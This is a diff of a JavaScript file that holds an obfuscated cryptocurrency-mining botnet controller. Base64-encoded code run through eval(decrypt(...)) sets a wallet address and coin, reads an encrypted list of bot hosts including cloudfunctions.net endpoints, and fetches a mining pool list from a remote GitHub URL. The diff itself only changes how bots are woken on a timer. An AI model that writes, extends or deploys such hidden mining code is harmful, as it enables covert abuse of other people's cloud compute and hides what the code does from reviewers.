@@ -22,10 +22,9 @@ var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
 y5jb2luID0gJ1R1YmUnOwpjLndhbGxldCA9ICdieGNuTHZ5WU5xYUQ0RDZRZEp5ektmY2pKNlFjTUxnTVcyRE1xRVNVcTh4OUpFTTlmQWc2Y2tXRG5hMlhFajJNOEhmQ1A4RXpjYm5TR2JrWUZndmJ6SHZtMlZBT
 jRrOEY2JzsKYy5oYXNoID0gJzAgaC9zIDAvMCc7CnZhciBsaXN0ID0gZGVjcnlwdChmcy5yZWFkRmlsZVN5bmMoJ2xpc3QudHh0JywndXRmOCcpKS5zcGxpdCgnXHJcbicpOwpjLmlkID0gTnVtYmVyKGxpc3Quc
 2hpZnQoKSk7CmMucGVlcnMgPSBbbGlzdC5zaGlmdCgpXTsgYy5wZWVycy5wdXNoKGxpc3Quc2hpZnQoKSk7CmZvcih2YXIgaT0wOyBpPGxpc3QubGVuZ3RoOyBpKyspIHsgbGV0IG5ib3Q9e2hvc3Q6bGlzdFtpX
-Swgc3RhdGU6J29yYW5nZScsIGhhc2g6JzAgaC9zIFswLzBdJ307IGJvdHMucHVzaChuYm90KTsgd2FrZXVwKG5ib3QsdHJ1ZSkgfTsKcmVxdWVzdCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL
-3NidXRjaC9teXBvb2wvbWFzdGVyL3Bvb2xzLnR4dCcsIGZ1bmN0aW9uKGVyciwgcmVzLCBib2R5KSB7CiAgdmFyIGxpc3QgPSBkZWNyeXB0KGJvZHkpLnNwbGl0KCdcclxuJyk7CiAgdmFyIG15Y29pbiA9IHJlc
-XVpcmUoJy4vJytjLmNvaW4rJy5qcycpOwogIGZvcih2YXIgaT0wOyBpPGxpc3QubGVuZ3RoOyBpKyspIHBvb2xzLnB1c2gobmV3IG15Y29pbih7IHdhbGxldDogYy53YWxsZXQsIGhvc3Q6IGxpc3RbaV0gfSkpO
-wp9KTs=`)
+Swgc3RhdGU6J29yYW5nZScsIGhhc2g6JzAgaC9zIFswLzBdJ307IGJvdHMucHVzaChuYm90KTsgd2FrZXVwKG5ib3QpIH07CnJlcXVlc3QoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zYnV0Y
+2gvbXlwb29sL21hc3Rlci9wb29scy50eHQnLCBmdW5jdGlvbihlcnIsIHJlcywgYm9keSkgewogIHZhciBsaXN0ID0gZGVjcnlwdChib2R5KS5zcGxpdCgnXHJcbicpOwogIHZhciBteWNvaW4gPSByZXF1aXJlK
+CcuLycrYy5jb2luKycuanMnKTsKICBmb3IodmFyIGk9MDsgaTxsaXN0Lmxlbmd0aDsgaSsrKSBwb29scy5wdXNoKG5ldyBteWNvaW4oeyB3YWxsZXQ6IGMud2FsbGV0LCBob3N0OiBsaXN0W2ldIH0pKTsKfSk7`)
 
 var superbot = decrypt(fs.readFileSync('superbot.js','utf8'));
 var worker = superbot+'\n'+decrypt(`
@@ -43,13 +42,10 @@ function mylist(obj) {
   return result
 }
 
-function wakeup(bot,now) {
+function wakeup(bot) {
   bot.msg = "wakeup";
-  if(now) onmsg(bot)
-  else {
-    bot.wakeup = setTimeout(function() { onmsg(bot) }, 60000);
-    bot.wakecount = 60
-  }
+  bot.wakeup = setTimeout(function() { onmsg(bot) }, 60000);
+  bot.wakecount = 60
 }
 
 function onmsg(bot) {
@@ -85,7 +81,7 @@ function onmsg(bot) {
       bot.hash = body.hash;
       bot.msg = body.msg;
       if(next) return onmsg(bot);
-      else return wakeup(bot,true)
+      else return wakeup(bot)
     }
     if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
     else bot.state = 'red'; 
